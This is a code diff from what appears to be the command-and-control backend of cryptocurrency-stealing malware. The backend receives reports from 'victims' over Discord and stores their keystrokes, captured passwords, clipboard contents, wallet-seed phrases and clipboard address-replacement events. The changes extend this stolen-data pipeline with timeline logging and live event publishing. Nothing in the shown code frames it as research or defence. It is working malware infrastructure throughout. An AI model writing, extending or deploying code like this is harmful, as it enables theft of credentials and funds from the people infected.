@@ -7,6 +7,8 @@ import { sealSecret, sha256hex, randomToken } from '../lib/crypto';
 import { ArtifactStatus } from '@prisma/client';
 import { processArtifact } from './artifact';
 import { publish } from '../lib/bus';
+import { recordEntry } from '../lib/timeline';
+import { detected as walletDetected } from '../lib/wallet-detection';
 import { env } from '../lib/env';
 import { notify, notifyVictimNew } from './notify';
 import { TASK_NAMES, isTaskQueuedAck, parseResultName } from '../lib/discord';
@@ -449,7 +451,7 @@ async function recordPassword(victimId: string, process: string, title: string, 
 }
 
 /** Clipboard floods collapse onto one row per kind+content inside a minute. */
-async function recordClipboard(victimId: string, kind: string, content: string, replaced: string | null): Promise<void> {
+export async function recordClipboard(victimId: string, kind: string, content: string, replaced: string | null, process = '', title = ''): Promise<void> {
   const since = new Date(Date.now() - 60_000);
   const existing = content
     ? await prisma.clipboardEntry.findFirst({
@@ -464,10 +466,10 @@ async function recordClipboard(victimId: string, kind: string, content: string, 
     }).catch(() => undefined);
     return;
   }
-  await prisma.clipboardEntry.create({ data: { victimId, ts: new Date(), process: '', window: '', content, kind, replaced } });
+  await prisma.clipboardEntry.create({ data: { victimId, ts: new Date(), process, window: title, content, kind, replaced } });
 }
 
-async function handleText(victimId: string, message: Message): Promise<void> {
+export async function handleText(victimId: string, message: Message): Promise<void> {
   const content = message.content.trim();
   if (!content) return;
   const dispatched = await prisma.task.count({ where: { victimId, discordMessageId: message.id } });
@@ -477,12 +479,43 @@ async function handleText(victimId: string, message: Message): Promise<void> {
   if (isTaskQueuedAck(content)) return;
 
   if (content.startsWith('wallet detected:')) {
-    await prisma.event.create({ data: { victimId, kind: 'wallet_detected', data: { text: norm(content) } } });
+    const parsed = content.slice(16).trim();
+    const pid = Number(parsed.match(/\((\d+)\)\s*$/)?.[1]) || null;
+    const name = parsed.replace(/\s*\(\d+\)\s*$/, '');
+    const data = { name: name || 'wallet', ...(pid ? { pid } : {}) };
+    const event = await prisma.event.create({ data: { victimId, kind: 'wallet_detected', data } });
+    void publish({ type: 'event.new', victimId, at: Date.now(), data: { ...data, kind: 'wallet_detected', id: event.id } });
+    await walletDetected(victimId, { name, pid });
+    return;
+  }
+  if (content === 'wallet closed' || content.startsWith('wallet closed:')) {
+    const data = { pid: Number(content.match(/\((\d+)\)/)?.[1]) || null };
+    const event = await prisma.event.create({ data: { victimId, kind: 'wallet_closed', data } });
+    void publish({ type: 'event.new', victimId, at: Date.now(), data: { ...data, kind: 'wallet_closed', id: event.id } });
+    return;
+  }
+  if (content.startsWith('keys:')) {
+    const rest = content.slice(5).trim();
+    const [process = '', title = '', ...body] = rest.split('|');
+    const text = body.join('|').trim();
+    if (!text) return;
+    await recordEntry(victimId, 'keystroke', { text, process: process.trim(), title: title.trim() }, content);
+    return;
+  }
+  if (content.startsWith('clipboard-text:')) {
+    const rest = content.slice(15).trim();
+    const [process = '', title = '', ...body] = rest.split('|');
+    const value = body.join('|').trim();
+    if (!value) return;
+    await recordEntry(victimId, 'clipboard', { content: value, process: process.trim(), title: title.trim() }, content);
+    await recordClipboard(victimId, 'text', value, null, process.trim(), title.trim());
     return;
   }
   if (content.startsWith('password?')) {
     const [proc, title, ...rest] = content.slice(10).split('|');
-    await recordPassword(victimId, (proc ?? '').trim(), (title ?? '').trim(), rest.join('|').trim());
+    const body = rest.join('|').trim();
+    await recordPassword(victimId, (proc ?? '').trim(), (title ?? '').trim(), body);
+    await recordEntry(victimId, 'keystroke', { text: body, process: (proc ?? '').trim(), title: (title ?? '').trim() }, content);
     return;
   }
   if (/^seed escrita:/i.test(content)) {
@@ -494,7 +527,9 @@ async function handleText(victimId: string, message: Message): Promise<void> {
     const value = content.includes(':') ? content.slice(content.lastIndexOf(':') + 1).trim() : '';
     if (value) {
       const clean = norm(value);
-      await prisma.event.create({ data: { victimId, kind: 'seed_found', data: { type: 'clipboard', value: clean, source: 'clipboard' } } });
+      const event = await prisma.event.create({ data: { victimId, kind: 'seed_found', data: { type: 'clipboard', value: clean, source: 'clipboard' } } });
+      void publish({ type: 'event.new', victimId, at: Date.now(), data: { kind: 'seed_found', type: 'clipboard', hash: createHash('sha256').update(clean).digest('hex'), count: 1, id: event.id } });
+      await recordEntry(victimId, 'clipboard', { content: clean, kind: 'seed', process: 'clipboard', title: content.slice(0, 120) }, content);
       await notify({
         kind: 'seed',
         victimId,
@@ -515,6 +550,9 @@ async function handleText(victimId: string, message: Message): Promise<void> {
     const kind = space > 0 ? before.slice(0, space) : 'text';
     const original = space > 0 ? before.slice(space + 1) : before;
     await recordClipboard(victimId, kind, original, replaced);
+    const event = await prisma.event.create({ data: { victimId, kind: 'clipboard_replace', data: { coin: kind, original, replacement: replaced ?? '' } } });
+    void publish({ type: 'event.new', victimId, at: Date.now(), data: { kind: 'clipboard_replace', coin: kind, original, replacement: replaced ?? '', id: event.id } });
+    await recordEntry(victimId, 'clipboard', { content: original, kind, process: 'clipboard', title: replaced ?? '' }, content);
     return;
   }
   if (content.startsWith('Failed:')) {
